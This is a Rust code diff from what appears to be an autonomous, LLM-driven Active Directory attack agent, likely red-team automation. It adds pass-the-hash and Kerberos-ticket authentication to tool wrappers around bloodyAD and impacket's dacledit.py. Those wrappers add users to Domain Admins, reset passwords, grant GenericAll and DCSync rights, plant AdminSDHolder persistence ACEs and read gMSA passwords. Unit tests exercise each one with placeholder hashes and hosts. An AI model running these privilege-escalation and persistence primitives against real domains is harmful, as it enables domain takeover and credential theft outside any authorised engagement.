@@ -22,14 +22,63 @@ fn domain_to_base_dn(domain: &str) -> String {
         .join(",")
 }
 
+/// The all-zero LM half every modern NTLM stack expects in front of an NT
+/// hash. Tools that take `LMHASH:NTHASH` reject a bare 32-hex NT hash.
+const EMPTY_LM_HASH: &str = "aad3b435b51404eeaad3b435b51404ee";
+
+/// Argument keys the credential resolver uses for NTLM hash material, in
+/// lookup order.
+const NTLM_HASH_KEYS: &[&str] = &["hash", "nt_hash", "ntlm_hash"];
+
+/// Error returned when a tool has no usable auth material at all.
+const NO_AUTH_MATERIAL: &str = "missing auth material: supply one of `ticket_path` \
+     (Kerberos ccache), `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash), or `password`";
+
+/// First non-empty NTLM hash argument, checked in [`NTLM_HASH_KEYS`] order.
+fn ntlm_hash_arg(args: &Value) -> Option<&str> {
+    NTLM_HASH_KEYS.iter().find_map(|key| {
+        optional_str(args, key)
+            .map(str::trim)
+            .filter(|s| !s.is_empty())
+    })
+}
+
+/// Normalize an NTLM hash argument to the `LMHASH:NTHASH` form.
+///
+/// A bare 32-hex NT hash gains the empty-LM prefix; an existing `LM:NT` pair
+/// (including impacket's `:NT` short form) passes through with the LM half
+/// filled in. Anything else is rejected — a malformed value handed to
+/// bloodyAD is silently treated as a cleartext password and burns a bind
+/// attempt against the account lockout counter.
+fn lm_nt_hash_pair(raw: &str) -> Result<String> {
+    fn is_hex32(s: &str) -> bool {
+        s.len() == 32 && s.chars().all(|c| c.is_ascii_hexdigit())
+    }
+
+    let trimmed = raw.trim();
+    match trimmed.split_once(':') {
+        Some((lm, nt)) if is_hex32(nt) && lm.is_empty() => Ok(format!("{EMPTY_LM_HASH}:{nt}")),
+        Some((lm, nt)) if is_hex32(nt) && is_hex32(lm) => Ok(format!("{lm}:{nt}")),
+        None if is_hex32(trimmed) => Ok(format!("{EMPTY_LM_HASH}:{trimmed}")),
+        _ => anyhow::bail!(
+            "malformed NTLM hash argument ({} chars): expected a 32-hex NT hash \
+             or LMHASH:NTHASH",
+            trimmed.len()
+        ),
+    }
+}
+
 /// Build a `bloodyAD` command with authentication already applied, ready for
 /// the caller to append the subcommand (`add groupMember …`, `set password …`,
 /// `add genericAll …`) and a timeout.
 ///
-/// A non-empty `ticket_path` selects Kerberos ccache auth and takes precedence:
-/// the cross-forest credential resolver injects an inter-realm ccache that an
-/// NTLM bind would reject with 0x52e (Bug B). Otherwise falls back to a
-/// `username` + `password` NTLM bind.
+/// Auth precedence: `ticket_path` > NTLM hash (`hash`/`nt_hash`/`ntlm_hash`) >
+/// `password`. A non-empty `ticket_path` wins because the cross-forest
+/// credential resolver injects an inter-realm ccache that an NTLM bind would
+/// reject with 0x52e (Bug B). The hash branch feeds bloodyAD's `-p` flag,
+/// which accepts `LMHASH:NTHASH` for NTLM authentication — without it every
+/// ACL edge discovered from a hash-only foothold converts to zero exploitation
+/// because the tool bails with "missing required argument: password".
 ///
 /// bloodyAD's `-k` is variadic (`nargs='*'`) and takes keyword arguments like
 /// `ccache=<path>`; there is NO `-K` flag. Passing `-k -K <path>` made argparse
@@ -37,39 +86,52 @@ fn domain_to_base_dn(domain: &str) -> String {
 /// so bloodyAD rejected the whole call. `KRB5CCNAME`/`KRB5_CONFIG` are exported
 /// as a belt-and-braces fallback that recent bloodyAD versions read directly.
 fn bloodyad_base(args: &Value, domain: &str, dc_ip: &str) -> Result<CommandBuilder> {
-    let ticket_path = optional_str(args, "ticket_path").filter(|s| !s.is_empty());
-
-    let cmd = if let Some(tpath) = ticket_path {
+    if let Some(tpath) = optional_str(args, "ticket_path").filter(|s| !s.is_empty()) {
         let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
         let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
-        CommandBuilder::new("bloodyAD")
+        return Ok(CommandBuilder::new("bloodyAD")
             .flag("-d", domain)
             .flag("--host", dc_ip)
             .arg("-k")
             .arg(format!("ccache={tpath}"))
             .env(ccname_key, ccname_val)
-            .env(cfg_key, cfg_val)
-    } else {
-        let username = required_str(args, "username")?;
-        let password = required_str(args, "password")?;
-        let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-        CommandBuilder::new("bloodyAD").args(creds)
-    };
-    Ok(cmd)
+            .env(cfg_key, cfg_val));
+    }
+
+    let username = required_str(args, "username")?;
+
+    if let Some(raw) = ntlm_hash_arg(args) {
+        return Ok(CommandBuilder::new("bloodyAD")
+            .flag("-d", domain)
+            .flag("-u", username)
+            .flag("-p", lm_nt_hash_pair(raw)?)
+            .flag("--host", dc_ip));
+    }
+
+    let password = optional_str(args, "password")
+        .filter(|s| !s.is_empty())
+        .ok_or_else(|| anyhow::anyhow!("{NO_AUTH_MATERIAL}"))?;
+    Ok(
+        CommandBuilder::new("bloodyAD").args(credentials::bloodyad_creds(
+            domain, username, password, dc_ip,
+        )),
+    )
 }
 
 /// Add a user to a group via `bloodyAD add groupMember`.
 ///
 /// Required args: `domain`, `dc_ip`, `group`, `target_user`
-/// Auth — one of:
+/// Auth — one of (precedence: ticket_path > hash > password), see
+/// [`bloodyad_base`]:
+///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
+///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
 ///   - `username` + `password` (plaintext NTLM bind)
-///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k -K <path>`)
 ///
-/// When `ticket_path` is provided it takes precedence over username/password
-/// — the cross-forest credential resolver injects an inter-realm ccache for
-/// foreign-forest writes that NTLM bind would reject with 0x52e. Without the
-/// Kerberos branch the ccache injection is silently dropped (Bug B) and the
-/// dispatch wastes the agent's tool budget on a guaranteed-failed bind.
+/// When `ticket_path` is provided it takes precedence — the cross-forest
+/// credential resolver injects an inter-realm ccache for foreign-forest writes
+/// that NTLM bind would reject with 0x52e. Without the Kerberos branch the
+/// ccache injection is silently dropped (Bug B) and the dispatch wastes the
+/// agent's tool budget on a guaranteed-failed bind.
 pub async fn bloodyad_add_group_member(args: &Value) -> Result<ToolOutput> {
     build_bloodyad_add_group_member(args)?.execute().await
 }
@@ -94,11 +156,13 @@ pub fn build_bloodyad_add_group_member(args: &Value) -> Result<CommandBuilder> {
 /// Set a user's password via `bloodyAD set password`.
 ///
 /// Required args: `domain`, `dc_ip`, `target_user`, `new_password`
-/// Auth — one of:
+/// Auth — one of (precedence: ticket_path > hash > password), see
+/// [`bloodyad_base`]:
+///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
+///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
 ///   - `username` + `password` (plaintext NTLM bind)
-///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k -K <path>`)
 ///
-/// When `ticket_path` is provided it takes precedence over password/hash.
+/// When `ticket_path` is provided it takes precedence over hash/password.
 /// The env var `KRB5CCNAME` is set to the path so bloodyad's Kerberos stack
 /// picks it up without a separate `kinit` step.
 pub async fn bloodyad_set_password(args: &Value) -> Result<ToolOutput> {
@@ -123,9 +187,11 @@ pub fn build_bloodyad_set_password(args: &Value) -> Result<CommandBuilder> {
 /// Grant GenericAll rights via `bloodyAD add genericAll`.
 ///
 /// Required args: `domain`, `dc_ip`, `target_dn`, `principal`
-/// Auth — one of:
+/// Auth — one of (precedence: ticket_path > hash > password), see
+/// [`bloodyad_base`]:
+///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k ccache=<path>`)
+///   - `username` + `hash`/`nt_hash`/`ntlm_hash` (NTLM pass-the-hash)
 ///   - `username` + `password` (plaintext NTLM bind)
-///   - `ticket_path` (Kerberos ccache path; bloodyAD `-k -K <path>`)
 ///
 /// `ticket_path` takes precedence — same Bug B rationale as
 /// `bloodyad_add_group_member`.
@@ -152,12 +218,17 @@ pub fn build_bloodyad_add_genericall(args: &Value) -> Result<CommandBuilder> {
 
 /// Add an ACL entry to the AdminSDHolder container via `bloodyAD add aclEntry`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `principal`
+/// Required args: `domain`, `username`, `dc_ip`, `principal`
 /// Optional args: `right` (default: `"FullControl"`)
+/// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
+/// [`bloodyad_base`].
 pub async fn adminsd_holder_add_ace(args: &Value) -> Result<ToolOutput> {
+    build_adminsd_holder_add_ace(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_adminsd_holder_add_ace(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let principal = required_str(args, "principal")?;
     let right = optional_str(args, "right").unwrap_or("FullControl");
@@ -165,18 +236,13 @@ pub async fn adminsd_holder_add_ace(args: &Value) -> Result<ToolOutput> {
     let base_dn = domain_to_base_dn(domain);
     let adminsd_dn = format!("CN=AdminSDHolder,CN=System,{base_dn}");
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
+    Ok(bloodyad_base(args, domain, dc_ip)?
         .arg("add")
         .arg("aclEntry")
         .arg(&adminsd_dn)
         .arg(principal)
         .arg(right)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .timeout_secs(120))
 }
 
 /// Read LDAP attributes of an object via `bloodyAD get object` — used by
@@ -203,26 +269,26 @@ pub async fn bloodyad_get_object(args: &Value) -> Result<ToolOutput> {
 
 /// Read a gMSA account's managed password via `bloodyAD get object`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `gmsa_account`
+/// Required args: `domain`, `username`, `dc_ip`, `gmsa_account`
+/// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
+/// [`bloodyad_base`].
 pub async fn gmsa_read_password_bloodyad(args: &Value) -> Result<ToolOutput> {
+    build_gmsa_read_password_bloodyad(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_gmsa_read_password_bloodyad(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let gmsa_account = required_str(args, "gmsa_account")?;
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
+    Ok(bloodyad_base(args, domain, dc_ip)?
         .arg("get")
         .arg("object")
         .arg(gmsa_account)
         .arg("--attr")
         .arg("msDS-ManagedPassword")
-        .timeout_secs(60)
-        .execute()
-        .await
+        .timeout_secs(60))
 }
 
 /// Manipulate msDS-KeyCredentialLink via `pywhisker.py`.
@@ -484,8 +550,10 @@ pub async fn pygpoabuse_immediate_task(args: &Value) -> Result<ToolOutput> {
 
 /// Modify an arbitrary attribute on an AD object via `bloodyAD set object`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `target`,
-/// `attribute`, `value`.
+/// Required args: `domain`, `username`, `dc_ip`, `target`, `attribute`,
+/// `value`.
+/// Auth: `ticket_path` > `hash`/`nt_hash`/`ntlm_hash` > `password`, see
+/// [`bloodyad_base`].
 ///
 /// `target` is the SAM account name or DN of the object being modified.
 /// `attribute` is the LDAP attribute name (e.g. `userPrincipalName`,
@@ -498,54 +566,95 @@ pub async fn pygpoabuse_immediate_task(args: &Value) -> Result<ToolOutput> {
 /// and any other primitive where the LLM needs to write a single
 /// attribute without granting itself a DACL right first.
 pub async fn bloodyad_set_object_attr(args: &Value) -> Result<ToolOutput> {
+    build_bloodyad_set_object_attr(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_bloodyad_set_object_attr(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
-    let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let target = required_str(args, "target")?;
     let attribute = required_str(args, "attribute")?;
     let value = required_str(args, "value")?;
 
-    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);
-
-    CommandBuilder::new("bloodyAD")
-        .args(creds)
+    Ok(bloodyad_base(args, domain, dc_ip)?
         .arg("set")
         .arg("object")
         .arg(target)
         .arg(attribute)
         .flag("-v", value)
-        .timeout_secs(60)
-        .execute()
-        .await
+        .timeout_secs(60))
 }
 
 /// Edit DACLs via `dacledit.py`.
 ///
-/// Required args: `domain`, `username`, `password`, `dc_ip`, `principal`, `rights`, `target_dn`
+/// Required args: `domain`, `username`, `dc_ip`, `principal`, `rights`, `target_dn`
 /// Optional args: `action` (default: `"write"`)
+/// Auth — one of (precedence: ticket_path > hash > password):
+/// - `ticket_path` — Kerberos ccache (`-k -no-pass` + `KRB5CCNAME`)
+/// - `hash`/`nt_hash`/`ntlm_hash` — NTLM pass-the-hash (`-hashes LM:NT`)
+/// - `password` — plaintext bind, folded into the impacket target string
+///
+/// `dacledit.py` is an impacket example script and exposes the standard
+/// impacket authentication group, so the hash and ccache branches need no
+/// wrapper-side emulation.
 pub async fn dacl_edit(args: &Value) -> Result<ToolOutput> {
+    build_dacl_edit(args)?.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_dacl_edit(args: &Value) -> Result<CommandBuilder> {
     let domain = required_str(args, "domain")?;
     let username = required_str(args, "username")?;
-    let password = required_str(args, "password")?;
     let dc_ip = required_str(args, "dc_ip")?;
     let principal = required_str(args, "principal")?;
     let rights = required_str(args, "rights")?;
     let target_dn = required_str(args, "target_dn")?;
     let action = optional_str(args, "action").unwrap_or("write");
 
-    let target = credentials::impacket_target(Some(domain), username, Some(password), dc_ip);
-
-    CommandBuilder::new("dacledit.py")
+    let mut cmd = CommandBuilder::new("dacledit.py")
         .flag("-action", action)
         .flag("-principal", principal)
         .flag("-rights", rights)
-        .flag("-target-dn", target_dn)
-        .arg(&target)
-        .flag("-dc-ip", dc_ip)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .flag("-target-dn", target_dn);
+
+    if let Some(tpath) = optional_str(args, "ticket_path").filter(|s| !s.is_empty()) {
+        let (ccname_key, ccname_val) = credentials::kerberos_env(tpath);
+        let (cfg_key, cfg_val) = credentials::krb5_config_env(tpath);
+        cmd = cmd
+            .arg(credentials::impacket_target(
+                Some(domain),
+                username,
+                None,
+                dc_ip,
+            ))
+            .arg("-k")
+            .arg("-no-pass")
+            .env(ccname_key, ccname_val)
+            .env(cfg_key, cfg_val);
+    } else if let Some(raw) = ntlm_hash_arg(args) {
+        cmd = cmd
+            .arg(credentials::impacket_target(
+                Some(domain),
+                username,
+                None,
+                dc_ip,
+            ))
+            .args(credentials::hash_args(&lm_nt_hash_pair(raw)?))
+            .arg("-no-pass");
+    } else {
+        let password = optional_str(args, "password")
+            .filter(|s| !s.is_empty())
+            .ok_or_else(|| anyhow::anyhow!("{NO_AUTH_MATERIAL}"))?;
+        cmd = cmd.arg(credentials::impacket_target(
+            Some(domain),
+            username,
+            Some(password),
+            dc_ip,
+        ));
+    }
+
+    Ok(cmd.flag("-dc-ip", dc_ip).timeout_secs(120))
 }
 
 #[cfg(test)]
@@ -1188,12 +1297,11 @@ mod tests {
     #[test]
     fn bloodyad_set_object_attr_requires_all_fields() {
         // Each missing field should error — confirms the schema is enforced
-        // by `required_str` at the implementation level (defence in depth
-        // against the LLM omitting fields the JSON schema also requires).
+        // at the implementation level (defence in depth against the LLM
+        // omitting fields the JSON schema also requires).
         for field in &[
             "domain",
             "username",
-            "password",
             "dc_ip",
             "target",
             "attribute",
@@ -1210,8 +1318,8 @@ mod tests {
             });
             args.as_object_mut().unwrap().remove(*field);
             assert!(
-                required_str(&args, field).is_err(),
-                "expected required_str({field}) to error"
+                super::build_bloodyad_set_object_attr(&args).is_err(),
+                "expected build_bloodyad_set_object_attr to reject missing {field}"
             );
         }
     }
@@ -1684,5 +1792,363 @@ mod tests {
     fn etype_hint_bitmask_none_when_all_unknown() {
         let args = json!({"etype_hint": ["completely-bogus"]});
         assert!(super::etype_hint_bitmask(&args).is_none());
+    }
+
+    // ── hash / ticket auth for the bloodyAD + dacledit family ───────────
+
+    const NT: &str = "0123456789abcdef0123456789abcdef";
+    const LM: &str = "fedcba9876543210fedcba9876543210";
+
+    /// Value that follows `flag` in the built argv, if present.
+    fn flag_value<'a>(argv: &'a [String], flag: &str) -> Option<&'a str> {
+        let idx = argv.iter().position(|a| a == flag)?;
+        argv.get(idx + 1).map(String::as_str)
+    }
+
+    fn with_arg(base: &Value, key: &str, value: &str) -> Value {
+        let mut args = base.clone();
+        args.as_object_mut()
+            .unwrap()
+            .insert(key.to_string(), Value::String(value.to_string()));
+        args
+    }
+
+    type Builder = fn(&Value) -> Result<CommandBuilder>;
+
+    /// Every bloodyAD-backed ACL tool paired with its non-auth arguments.
+    fn bloodyad_tool_cases() -> Vec<(&'static str, Value, Builder)> {
+        vec![
+            (
+                "bloodyad_add_group_member",
+                json!({
+                    "domain": "contoso.local", "username": "alice",
+                    "dc_ip": "192.168.58.10", "group": "Domain Admins",
+                    "target_user": "bob"
+                }),
+                super::build_bloodyad_add_group_member as Builder,
+            ),
+            (
+                "bloodyad_set_password",
+                json!({
+                    "domain": "contoso.local", "username": "alice",
+                    "dc_ip": "192.168.58.10", "target_user": "bob",
+                    "new_password": "NewP@ss123!"
+                }),
+                super::build_bloodyad_set_password as Builder,
+            ),
+            (
+                "bloodyad_add_genericall",
+                json!({
+                    "domain": "contoso.local", "username": "alice",
+                    "dc_ip": "192.168.58.10",
+                    "target_dn": "CN=bob,CN=Users,DC=contoso,DC=local",
+                    "principal": "alice"
+                }),
+                super::build_bloodyad_add_genericall as Builder,
+            ),
+            (
+                "bloodyad_set_object_attr",
+                json!({
+                    "domain": "contoso.local", "username": "alice",
+                    "dc_ip": "192.168.58.10", "target": "bob",
+                    "attribute": "userPrincipalName",
+                    "value": "administrator@contoso.local"
+                }),
+                super::build_bloodyad_set_object_attr as Builder,
+            ),
+            (
+                "adminsd_holder_add_ace",
+                json!({
+                    "domain": "contoso.local", "username": "alice",
+                    "dc_ip": "192.168.58.10", "principal": "bob"
+                }),
+                super::build_adminsd_holder_add_ace as Builder,
+            ),
+            (
+                "gmsa_read_password_bloodyad",
+                json!({
+                    "domain": "contoso.local", "username": "alice",
+                    "dc_ip": "192.168.58.10", "gmsa_account": "svc_web$"
+                }),
+                super::build_gmsa_read_password_bloodyad as Builder,
+            ),
+        ]
+    }
+
+    #[test]
+    fn bloodyad_hash_normalizes_to_lm_nt_password_flag() {
+        let expected_empty_lm = format!("aad3b435b51404eeaad3b435b51404ee:{NT}");
+        let cases: Vec<(&str, String, String)> = vec![
+            ("hash", NT.to_string(), expected_empty_lm.clone()),
+            ("hash", format!("{LM}:{NT}"), format!("{LM}:{NT}")),
+            ("hash", format!(":{NT}"), expected_empty_lm.clone()),
+            ("hash", format!("  {NT}  "), expected_empty_lm.clone()),
+            ("nt_hash", NT.to_string(), expected_empty_lm.clone()),
+            ("ntlm_hash", NT.to_string(), expected_empty_lm),
+        ];
+
+        let base = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "group": "Domain Admins",
+            "target_user": "bob"
+        });
+        for (key, raw, expected) in cases {
+            let cmd = super::build_bloodyad_add_group_member(&with_arg(&base, key, &raw)).unwrap();
+            let argv = cmd.args_for_test();
+            assert_eq!(
+                flag_value(argv, "-p"),
+                Some(expected.as_str()),
+                "{key}={raw} must reach bloodyAD as -p LMHASH:NTHASH"
+            );
+            assert_eq!(flag_value(argv, "-u"), Some("alice"));
+            assert_eq!(flag_value(argv, "-d"), Some("contoso.local"));
+            assert_eq!(flag_value(argv, "--host"), Some("192.168.58.10"));
+            assert!(
+                argv.iter().all(|a| a != "-k"),
+                "hash auth must not select the Kerberos branch"
+            );
+            assert!(cmd
+                .env_vars_for_test()
+                .iter()
+                .all(|(k, _)| k != "KRB5CCNAME"));
+        }
+    }
+
+    #[test]
+    fn bloodyad_malformed_hash_rejected() {
+        let base = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "group": "Domain Admins",
+            "target_user": "bob"
+        });
+        for raw in [
+            "not-a-hash",
+            "0123456789abcdef",
+            "0123456789abcdef0123456789abcde",
+            "0123456789abcdef0123456789abcdefa",
+            "zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
+            "nolm:0123456789abcdef0123456789abcde",
+            "0123456789abcdef0123456789abcdef:short",
+        ] {
+            let Err(err) = super::build_bloodyad_add_group_member(&with_arg(&base, "hash", raw))
+            else {
+                panic!("malformed hash {raw:?} must not reach the subprocess");
+            };
+            assert!(
+                err.to_string().contains("malformed NTLM hash"),
+                "expected a malformed-hash error for {raw:?}, got: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn bloodyad_auth_precedence_is_ticket_then_hash_then_password() {
+        let base = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "group": "Domain Admins",
+            "target_user": "bob"
+        });
+
+        let all_three = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "group": "Domain Admins",
+            "target_user": "bob",
+            "password": "P@ssw0rd!",   // pragma: allowlist secret
+            "hash": NT,
+            "ticket_path": "/tmp/ares-tickets/alice.ccache"
+        });
+        let cmd = super::build_bloodyad_add_group_member(&all_three).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv
+            .iter()
+            .any(|a| a == "ccache=/tmp/ares-tickets/alice.ccache"));
+        assert!(
+            argv.iter().all(|a| a != "-p"),
+            "ticket_path must suppress both -p forms; got {argv:?}"
+        );
+
+        let hash_and_password = with_arg(&with_arg(&base, "hash", NT), "password", "P@ssw0rd!");
+        let cmd = super::build_bloodyad_add_group_member(&hash_and_password).unwrap();
+        assert_eq!(
+            flag_value(cmd.args_for_test(), "-p"),
+            Some(format!("aad3b435b51404eeaad3b435b51404ee:{NT}").as_str()),
+            "hash must win over password"
+        );
+
+        let cmd = super::build_bloodyad_add_group_member(&with_arg(&base, "password", "P@ssw0rd!"))
+            .unwrap();
+        assert_eq!(flag_value(cmd.args_for_test(), "-p"), Some("P@ssw0rd!"));
+    }
+
+    #[test]
+    fn bloodyad_empty_hash_falls_back_to_password() {
+        let base = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "group": "Domain Admins",
+            "target_user": "bob",
+            "password": "P@ssw0rd!"   // pragma: allowlist secret
+        });
+        let cmd = super::build_bloodyad_add_group_member(&with_arg(&base, "hash", "")).unwrap();
+        assert_eq!(flag_value(cmd.args_for_test(), "-p"), Some("P@ssw0rd!"));
+    }
+
+    #[test]
+    fn bloodyad_family_accepts_hash_only_auth() {
+        for (name, base, build) in bloodyad_tool_cases() {
+            let cmd = build(&with_arg(&base, "hash", NT))
+                .unwrap_or_else(|e| panic!("{name} must build from a hash alone: {e}"));
+            let argv = cmd.args_for_test();
+            assert_eq!(
+                flag_value(argv, "-p"),
+                Some(format!("aad3b435b51404eeaad3b435b51404ee:{NT}").as_str()),
+                "{name} must pass the hash through bloodyAD's -p flag"
+            );
+            assert_eq!(flag_value(argv, "-u"), Some("alice"), "{name}");
+        }
+    }
+
+    #[test]
+    fn bloodyad_family_accepts_ticket_only_auth() {
+        for (name, base, build) in bloodyad_tool_cases() {
+            let args = with_arg(&base, "ticket_path", "/tmp/ares-tickets/alice.ccache");
+            let cmd = build(&args)
+                .unwrap_or_else(|e| panic!("{name} must build from a ccache alone: {e}"));
+            let argv = cmd.args_for_test();
+            assert!(argv.iter().any(|a| a == "-k"), "{name} missing -k");
+            assert!(
+                argv.iter()
+                    .any(|a| a == "ccache=/tmp/ares-tickets/alice.ccache"),
+                "{name} must use bloodyAD's `-k ccache=<path>` keyword form"
+            );
+            assert!(
+                cmd.env_vars_for_test()
+                    .iter()
+                    .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/alice.ccache"),
+                "{name} must export KRB5CCNAME"
+            );
+        }
+    }
+
+    #[test]
+    fn bloodyad_family_accepts_password_only_auth() {
+        for (name, base, build) in bloodyad_tool_cases() {
+            let cmd = build(&with_arg(&base, "password", "P@ssw0rd!"))
+                .unwrap_or_else(|e| panic!("{name} must build from a password alone: {e}"));
+            let argv = cmd.args_for_test();
+            assert_eq!(flag_value(argv, "-p"), Some("P@ssw0rd!"), "{name}");
+            assert!(argv.iter().all(|a| a != "-k"), "{name}");
+        }
+    }
+
+    #[test]
+    fn bloodyad_family_without_auth_material_errors() {
+        for (name, base, build) in bloodyad_tool_cases() {
+            assert!(
+                build(&base).is_err(),
+                "{name} must refuse to dispatch without any auth material"
+            );
+        }
+    }
+
+    #[test]
+    fn bloodyad_missing_auth_error_names_every_accepted_form() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "group": "Domain Admins",
+            "target_user": "bob"
+        });
+        let Err(err) = super::build_bloodyad_add_group_member(&args) else {
+            panic!("no auth material must be an error");
+        };
+        let err = err.to_string();
+        for form in ["ticket_path", "hash", "nt_hash", "ntlm_hash", "password"] {
+            assert!(
+                err.contains(form),
+                "error must name the `{form}` auth form; got: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn dacl_edit_hash_uses_impacket_hashes_flag() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "principal": "bob",
+            "rights": "DCSync", "target_dn": "DC=contoso,DC=local",
+            "hash": NT
+        });
+        let cmd = super::build_dacl_edit(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert_eq!(
+            flag_value(argv, "-hashes"),
+            Some(format!("aad3b435b51404eeaad3b435b51404ee:{NT}").as_str())
+        );
+        assert!(argv.iter().any(|a| a == "-no-pass"));
+        assert!(
+            argv.iter()
+                .any(|a| a == "contoso.local/alice@192.168.58.10"),
+            "pass-the-hash target string must carry no password; got {argv:?}"
+        );
+    }
+
+    #[test]
+    fn dacl_edit_ticket_uses_kerberos_flags() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "principal": "bob",
+            "rights": "DCSync", "target_dn": "DC=contoso,DC=local",
+            "ticket_path": "/tmp/ares-tickets/alice.ccache"
+        });
+        let cmd = super::build_dacl_edit(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv.iter().any(|a| a == "-k"));
+        assert!(argv.iter().any(|a| a == "-no-pass"));
+        assert!(argv.iter().all(|a| a != "-hashes"));
+        assert!(cmd
+            .env_vars_for_test()
+            .iter()
+            .any(|(k, v)| k == "KRB5CCNAME" && v == "/tmp/ares-tickets/alice.ccache"));
+    }
+
+    #[test]
+    fn dacl_edit_password_branch_unchanged() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "principal": "bob",
+            "rights": "DCSync", "target_dn": "DC=contoso,DC=local",
+            "password": "P@ssw0rd!"   // pragma: allowlist secret
+        });
+        let cmd = super::build_dacl_edit(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv
+            .iter()
+            .any(|a| a == "contoso.local/alice:P@ssw0rd!@192.168.58.10"));
+        assert!(argv.iter().all(|a| a != "-hashes"));
+        assert!(argv.iter().all(|a| a != "-k"));
+    }
+
+    #[test]
+    fn dacl_edit_without_auth_material_errors() {
+        let args = json!({
+            "domain": "contoso.local", "username": "alice",
+            "dc_ip": "192.168.58.10", "principal": "bob",
+            "rights": "DCSync", "target_dn": "DC=contoso,DC=local"
+        });
+        assert!(super::build_dacl_edit(&args).is_err());
+    }
+
+    #[test]
+    fn adminsd_holder_hash_auth_keeps_container_dn() {
+        let args = json!({
+            "domain": "fabrikam.local", "username": "alice",
+            "dc_ip": "192.168.58.20", "principal": "bob",
+            "hash": format!("{LM}:{NT}")
+        });
+        let cmd = super::build_adminsd_holder_add_ace(&args).unwrap();
+        let argv = cmd.args_for_test();
+        assert!(argv
+            .iter()
+            .any(|a| a == "CN=AdminSDHolder,CN=System,DC=fabrikam,DC=local"));
+        assert_eq!(flag_value(argv, "-p"), Some(format!("{LM}:{NT}").as_str()));
     }
 }
